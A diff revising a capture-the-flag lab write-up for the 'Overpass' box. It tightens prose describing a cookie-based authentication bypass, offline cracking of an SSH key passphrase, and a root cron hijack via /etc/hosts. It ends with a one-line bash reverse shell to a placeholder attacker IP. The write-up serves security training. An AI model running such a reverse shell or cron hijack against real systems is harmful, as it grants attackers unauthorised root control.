@@ -9,31 +9,11 @@
 
 ## Overview
 
-Overpass is a Linux box styled as a fictional "password manager" built by broke CompSci students. The intended chain is a full recon-to-root walkthrough: directory enumeration surfaces an administrator login page, client-side JavaScript authentication is bypassed by forging a session cookie, the admin page leaks a passphrase-protected SSH private key and enough hints to guess the key owner, the passphrase is cracked offline with John, and a misconfigured root cron job that pulls a build script over an unregistered domain name is hijacked by editing `/etc/hosts` and serving a malicious payload over HTTP.
+Client-side JavaScript authentication on the `/admin` page is bypassed by setting an arbitrary `SessionToken` cookie, the admin area leaks a passphrase-protected RSA private key whose passphrase (`james13`) falls to `ssh2john` plus rockyou, and a root cron pulling `overpass.thm/downloads/src/buildscript.sh` is hijacked via writable `/etc/hosts` plus a Python HTTP server to land a reverse shell as root.
 
 ---
 
-## Target Information
-
-| Field | Value |
-|---|---|
-| Target IP | 10.65.167.65 |
-| OS | Ubuntu 20.04 (Linux 5.15) |
-| Open Ports | 22 (SSH), 80 (HTTP) |
-| Initial User | james |
-| Privilege Escalation | Cron job hijack via writable `/etc/hosts` |
-
----
-
-## Tools Used
-
-- Nmap (port and service enumeration)
-- Gobuster (directory brute force)
-- Browser DevTools (JavaScript source review, cookie manipulation)
-- ssh2john + John the Ripper (SSH key passphrase cracking)
-- SSH (initial foothold)
-- Python HTTP server (hosting malicious build script)
-- Netcat (reverse shell listener)
+**Target:** `10.65.167.65` (Ubuntu 20.04 / Linux 5.15)
 
 ---
 
@@ -41,7 +21,7 @@ Overpass is a Linux box styled as a fictional "password manager" built by broke 
 
 ### Phase 1: Port and Service Enumeration
 
-A full TCP port scan with service detection surfaced only two services.
+A full TCP Nmap scan with service detection surfaced only two services.
 
 <img src="01-nmap-scan.png" width="800">
 
@@ -92,7 +72,7 @@ Invalid credentials are rejected with an "Incorrect Credentials" message, which 
 
 ### Phase 5: Client-Side Authentication Bypass
 
-The login logic is implemented in JavaScript loaded directly on the page.
+Browser DevTools showed that the login logic is implemented in JavaScript loaded directly on the page.
 
 <img src="05-broken-authentication.png" width="800">
 
@@ -171,7 +151,7 @@ Two observations made this immediately exploitable:
 
 Adding `overpass.thm` to `/etc/hosts` pointing at the attacker IP, serving a malicious `buildscript.sh` over a Python HTTP server at the exact path `/downloads/src/buildscript.sh`, and waiting one minute caused cron to fetch and execute the payload as root.
 
-The payload was a bash reverse shell to the attacker listener on port 4444:
+The payload was a bash reverse shell to a Netcat listener on port 4444:
 
 ```
 bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
